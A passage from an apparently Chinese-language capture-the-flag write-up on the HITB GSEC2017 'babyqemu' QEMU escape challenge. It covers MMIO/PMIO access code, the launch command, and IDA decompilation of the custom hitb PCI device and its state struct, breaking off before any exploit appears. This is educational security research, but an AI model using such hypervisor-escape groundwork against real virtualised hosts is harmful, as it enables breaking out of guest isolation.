class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem @ %p\n&quot;</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    mmio_read(<span class="number">0x128</span>);</span><br><span class="line">    mmio_write(<span class="number">0x128</span>, <span class="number">1337</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>在内核态下访问mmio空间代码示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ioport.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> addr=ioremap(ioaddr,iomemsize);</span><br><span class="line">readb(addr);</span><br><span class="line">readw(addr);</span><br><span class="line">readl(addr);</span><br><span class="line">readq(addr);<span class="comment">//qwords=8 btyes</span></span><br><span class="line"></span><br><span class="line">writeb(val,addr);</span><br><span class="line">writew(val,addr);</span><br><span class="line">writel(val,addr);</span><br><span class="line">writeq(val,addr);</span><br><span class="line">iounmap(addr);</span><br></pre></td></tr></table></figure><h3 id="pmio"><a href="#pmio" class="headerlink" title="pmio"></a>pmio</h3><p>端口映射io，内存和io设备有个字独立的地址空间，cpu需要通过专门的指令才能去访问。在intel的微处理器中使用的指令是IN和OUT。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/pmio.png"                      alt="pmio"                ></p><ul><li>  Bit 0：Region Type，总是为 1，用于区分此类型为 I/O</li><li>  Bit 1：Reserved</li><li>  Bits 31-2：Base Address，以 4 字节对齐基址</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/pmio_layout.png"                      alt="pmio_layout"                ></p><p><strong>访问pmio代码示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="keyword">uint32_t</span> pmio_base = <span class="number">0xc050</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outl(value,addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)inl(addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )</span><br><span class="line">        die(<span class="string">&quot;I/O permission is not enough&quot;</span>);</span><br><span class="line">        pmio_write(pmio_base+<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    pmio_write(pmio_base+<span class="number">4</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="lspci"><a href="#lspci" class="headerlink" title="lspci"></a>lspci</h3><p>pci外设地址，形如<code>0000:00:1f.1</code>。第一个部分16位表示域；第二个部分8位表示总线编号；第三个部分5位表示设备号；最后一个部分表示3位表示功能号。下面是lspci的输出，其中pci设备的地址，在最头部给出，由于pc设备总只有一个0号域，随意会省略域。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230204154525744.png"                      alt="image-20230204154525744"                ></p><p>在<code>/sys/bus/pci/devices</code>可以找到每个总线设备相关的一写文件。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230204155149832.png"                      alt="image-20230204155149832"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230204155333889.png"                      alt="image-20230204155333889"                ></p><p>每个设备的目录下<code>resource0</code> 对应MMIO空间。<code>resource1</code> 对应PMIO空间。<br>resource文件里面会记录相关的数据，第一行就是mimo的信息，从左到右是：起始地址、结束地址、标识位。</p><h2 id="HITB-GSEC2017-babyqemu"><a href="#HITB-GSEC2017-babyqemu" class="headerlink" title="HITB GSEC2017 babyqemu"></a>HITB GSEC2017 babyqemu</h2><p><del>因为是第一次玩qemu逃逸，所以题目记录的比较详细，偏向新手向！</del></p><h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>首先注意的是加载文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">./qemu-system-x86_64 \</span><br><span class="line">-initrd ./rootfs.cpio \</span><br><span class="line">-kernel ./vmlinuz-4.8.0-52-generic \</span><br><span class="line">-append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27;</span> \</span><br><span class="line">-enable-kvm \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-m 64M --nographic  -L ./dependency/usr/<span class="built_in">local</span>/share/qemu \</span><br><span class="line">-L pc-bios \</span><br><span class="line">-device hitb,id=vda</span><br></pre></td></tr></table></figure><p>这里需要注意的是 -device 选项，可以看到这里的设备为 hitb 这个pci设备。</p><p>那么逆向的方法就是将qemu-system-x86_64拖入ida搜索hitb</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230204162747766.png"                      alt="image-20230204162747766"                ></p><p>首先则是先观察init函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hitb_class_init</span><span class="params">(ObjectClass_0 *a1, <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ObjectClass_0 *v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = object_class_dynamic_cast_assert(</span><br><span class="line">         a1,</span><br><span class="line">         (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_64A230.bulk_in_pending[<span class="number">2</span>].data[<span class="number">72</span>],</span><br><span class="line">         (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_5AB2C8.msi_vectors,</span><br><span class="line">         <span class="number">469</span>,</span><br><span class="line">         <span class="string">&quot;hitb_class_init&quot;</span>);</span><br><span class="line">  BYTE4(v2[<span class="number">2</span>].object_cast_cache[<span class="number">3</span>]) = <span class="number">16</span>;</span><br><span class="line">  HIWORD(v2[<span class="number">2</span>].object_cast_cache[<span class="number">3</span>]) = <span class="number">255</span>;</span><br><span class="line">  v2[<span class="number">2</span>].type = (Type)pci_hitb_realize;</span><br><span class="line">  v2[<span class="number">2</span>].object_cast_cache[<span class="number">0</span>] = (<span class="keyword">const</span> <span class="keyword">char</span> *)pci_hitb_uninit;</span><br><span class="line">  LOWORD(v2[<span class="number">2</span>].object_cast_cache[<span class="number">3</span>]) = <span class="number">4660</span>;</span><br><span class="line">  WORD1(v2[<span class="number">2</span>].object_cast_cache[<span class="number">3</span>]) = <span class="number">9011</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在init初始化函数，需要将设备类型定义为PCIDeviceClass结构体。PCIDeviceClass结构体在Local type中可以找到它的描述定义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PCIDeviceClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  DeviceClass_0 parent_class;</span><br><span class="line">  <span class="keyword">void</span> (*realize)(PCIDevice_0 *, Error_0 **);    <span class="comment">//0xc0</span></span><br><span class="line">  <span class="keyword">int</span> (*init)(PCIDevice_0 *);</span><br><span class="line">  PCIUnregisterFunc *<span class="built_in">exit</span>;</span><br><span class="line">  PCIConfigReadFunc *config_read;</span><br><span class="line">  PCIConfigWriteFunc *config_write;</span><br><span class="line">  <span class="keyword">uint16_t</span> vendor_id;    <span class="comment">//0xe8</span></span><br><span class="line">  <span class="keyword">uint16_t</span> device_id;    <span class="comment">//0xea</span></span><br><span class="line">  <span class="keyword">uint8_t</span> revision;</span><br><span class="line">  <span class="keyword">uint16_t</span> class_id;</span><br><span class="line">  <span class="keyword">uint16_t</span> subsystem_vendor_id;</span><br><span class="line">  <span class="keyword">uint16_t</span> subsystem_id;</span><br><span class="line">  <span class="keyword">int</span> is_bridge;</span><br><span class="line">  <span class="keyword">int</span> is_express;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *romfile;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里手动添加一下结构体再修改init函数中的变量定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> PCIDeviceClass struc ; (<span class="keyword">sizeof</span>=<span class="number">0x108</span>, align=<span class="number">0x8</span>, copyof_1371)</span><br><span class="line"><span class="number">00000000</span> parent_class DeviceClass_0 ?</span><br><span class="line"><span class="number">000000</span>C0 realize dq ?                            ; offset</span><br><span class="line"><span class="number">000000</span>C8 init dq ?                               ; offset</span><br><span class="line"><span class="number">000000</span>D0 <span class="built_in">exit</span> dq ?                               ; offset</span><br><span class="line"><span class="number">000000</span>D8 config_read dq ?                        ; offset</span><br><span class="line"><span class="number">000000E0</span> config_write dq ?                       ; offset</span><br><span class="line"><span class="number">000000E8</span> vendor_id dw ?</span><br><span class="line"><span class="number">000000</span>EA device_id dw ?</span><br><span class="line"><span class="number">000000</span>EC revision db ?</span><br><span class="line"><span class="number">000000</span>ED db ? ; undefined</span><br><span class="line"><span class="number">000000</span>EE class_id dw ?</span><br><span class="line"><span class="number">000000F</span>0 subsystem_vendor_id dw ?</span><br><span class="line"><span class="number">000000F</span>2 subsystem_id dw ?</span><br><span class="line"><span class="number">000000F</span>4 is_bridge dd ?</span><br><span class="line"><span class="number">000000F</span>8 is_express dd ?</span><br><span class="line"><span class="number">000000F</span>C db ? ; undefined</span><br><span class="line"><span class="number">000000F</span>D db ? ; undefined</span><br><span class="line"><span class="number">000000F</span>E db ? ; undefined</span><br><span class="line"><span class="number">000000F</span>F db ? ; undefined</span><br><span class="line"><span class="number">00000100</span> romfile dq ?                            ; offset</span><br><span class="line"><span class="number">00000108</span> PCIDeviceClass ends</span><br><span class="line"><span class="number">00000108</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hitb_class_init</span><span class="params">(ObjectClass_0 *a1, <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  PCIDeviceClass *v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = (PCIDeviceClass *)object_class_dynamic_cast_assert(</span><br><span class="line">                           a1,</span><br><span class="line">                           (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_64A230.bulk_in_pending[<span class="number">2</span>].data[<span class="number">72</span>],</span><br><span class="line">                           (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_5AB2C8.msi_vectors,</span><br><span class="line">                           <span class="number">469</span>,</span><br><span class="line">                           <span class="string">&quot;hitb_class_init&quot;</span>);</span><br><span class="line">  v2-&gt;revision = <span class="number">16</span>;</span><br><span class="line">  v2-&gt;class_id = <span class="number">255</span>;</span><br><span class="line">  v2-&gt;realize = pci_hitb_realize;</span><br><span class="line">  v2-&gt;<span class="built_in">exit</span> = pci_hitb_uninit;</span><br><span class="line">  v2-&gt;vendor_id = <span class="number">4660</span>;</span><br><span class="line">  v2-&gt;device_id = <span class="number">0x2333</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到设备号device_id=0x2333，功能号vendor_id=0x1234</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># lspci -v</span></span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 00ff: 1234:2333</span><br><span class="line"></span><br><span class="line"><span class="comment"># ls /sys/bus/pci/devices/0000\:00\:04.0/</span></span><br><span class="line">broken_parity_status      firmware_node             rescan</span><br><span class="line">class                     irq                       resource</span><br><span class="line">config                    local_cpulist             resource0</span><br><span class="line">consistent_dma_mask_bits  local_cpus                subsystem</span><br><span class="line">d3cold_allowed            modalias                  subsystem_device</span><br><span class="line">device                    msi_bus                   subsystem_vendor</span><br><span class="line">dma_mask_bits             numa_node                 uevent</span><br><span class="line">driver_override           power                     vendor</span><br><span class="line"><span class="built_in">enable</span>                    remove</span><br><span class="line"></span><br><span class="line"><span class="comment"># cat /sys/bus/pci/devices/0000\:00\:04.0/resource</span></span><br><span class="line">0x00000000fea00000 0x00000000feafffff 0x0000000000040200</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>resource文件内容的格式为start end flag 。在resource0文件中，根据这里没有resource1文件或者根据flag最后一位为0可知存在一个MMIO的内存空间，地址为0xfea00000，大小为0x100000。</p><p>其次分析注册的函数，通过<code>pci_hitb_realize</code>函数查看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">pci_hitb_realize</span><span class="params">(HitbState *pdev, Error_0 **errp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  pdev-&gt;pdev.config[<span class="number">61</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !msi_init(&amp;pdev-&gt;pdev, <span class="number">0</span>, <span class="number">1u</span>, <span class="number">1</span>, <span class="number">0</span>, errp) )</span><br><span class="line">  &#123;</span><br><span class="line">    timer_init_tl(&amp;pdev-&gt;dma_timer, main_loop_tlg.tl[<span class="number">1</span>], <span class="number">1000000</span>, (QEMUTimerCB *)hitb_dma_timer, pdev);</span><br><span class="line">    qemu_mutex_init(&amp;pdev-&gt;thr_mutex);</span><br><span class="line">    qemu_cond_init(&amp;pdev-&gt;thr_cond);</span><br><span class="line">    qemu_thread_create(&amp;pdev-&gt;thread, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_5AB2C8.not_legacy_32bit + <span class="number">12</span>, hitb_fact_thread, pdev, <span class="number">0</span>);</span><br><span class="line">    memory_region_init_io(&amp;pdev-&gt;mmio, &amp;pdev-&gt;pdev.qdev.parent_obj, &amp;hitb_mmio_ops, pdev, <span class="string">&quot;hitb-mmio&quot;</span>, <span class="number">0x100000</span>uLL);</span><br><span class="line">    pci_register_bar(&amp;pdev-&gt;pdev, <span class="number">0</span>, <span class="number">0</span>, &amp;pdev-&gt;mmio);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先可以看到在<code>timer_init_tl</code>函数是将<code>hitb_dma_timer</code>作为回调函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">timer_init_tl</span><span class="params">(QEMUTimer_0 *ts, QEMUTimerList_0 *timer_list, <span class="keyword">int</span> scale, QEMUTimerCB *cb, <span class="keyword">void</span> *opaque)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ts-&gt;timer_list = timer_list;</span><br><span class="line">  ts-&gt;cb = cb;</span><br><span class="line">  ts-&gt;opaque = opaque;</span><br><span class="line">  ts-&gt;scale = scale;</span><br><span class="line">  ts-&gt;expire_time = <span class="number">-1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着在下面注册了<code>hitb_mmio_ops</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:<span class="number">00000000009690</span>A0 <span class="number">40</span> <span class="number">44</span> <span class="number">28</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> A0 <span class="number">41</span>+hitb_mmio_ops dq offset hitb_mmio_read                ; read</span><br><span class="line">.data.rel.ro:<span class="number">00000000009690</span>A0 <span class="number">28</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>+                                        ; DATA XREF: pci_hitb_realize+<span class="number">99</span>↑o</span><br><span class="line">.data.rel.ro:<span class="number">00000000009690</span>A0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>+dq offset hitb_mmio_write               ; write</span><br><span class="line">.data.rel.ro:<span class="number">00000000009690</span>A0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>+dq <span class="number">0</span></span><br></pre></td></tr></table></figure><p>所以这里需要重点注意的也就是这样三个函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hitb_mmio_read</span><br><span class="line">hitb_mmio_write</span><br><span class="line">hitb_dma_timer</span><br></pre></td></tr></table></figure><h3 id="分析函数"><a href="#分析函数" class="headerlink" title="分析函数"></a>分析函数</h3><p>在分析函数之前还需要搞懂设备结构体，具体可以在view-&gt;Open Subviews-&gt;Local Type(shift + F1)中搜索</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((<span class="title">aligned</span>(16))) <span class="title">HitbState</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  PCIDevice_0 pdev;</span><br><span class="line">  MemoryRegion_0 mmio;</span><br><span class="line">  QemuThread_0 thread;</span><br><span class="line">  QemuMutex_0 thr_mutex;</span><br><span class="line">  QemuCond_0 thr_cond;</span><br><span class="line">  <span class="keyword">bool</span> stopping;</span><br><span class="line">  <span class="keyword">uint32_t</span> addr4;</span><br><span class="line">  <span class="keyword">uint32_t</span> fact;</span><br><span class="line">  <span class="keyword">uint32_t</span> status;</span><br><span class="line">  <span class="keyword">uint32_t</span> irq_status;</span><br><span class="line">  dma_state dma;</span><br><span class="line">  QEMUTimer_0 dma_timer;</span><br><span class="line">  <span class="keyword">char</span> dma_buf[<span class="number">4096</span>];</span><br><span class="line">  <span class="keyword">void</span> (*enc)(<span class="keyword">char</span> *, <span class="keyword">unsigned</span> <span class="keyword">int</span>);</span><br><span class="line">  <span class="keyword">uint64_t</span> dma_mask;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dma_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">dma_addr_t</span> src;</span><br><span class="line">  <span class="keyword">dma_addr_t</span> dst;</span><br><span class="line">  <span class="keyword">dma_addr_t</span> cnt;</span><br><span class="line">  <span class="keyword">dma_addr_t</span> cmd;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> 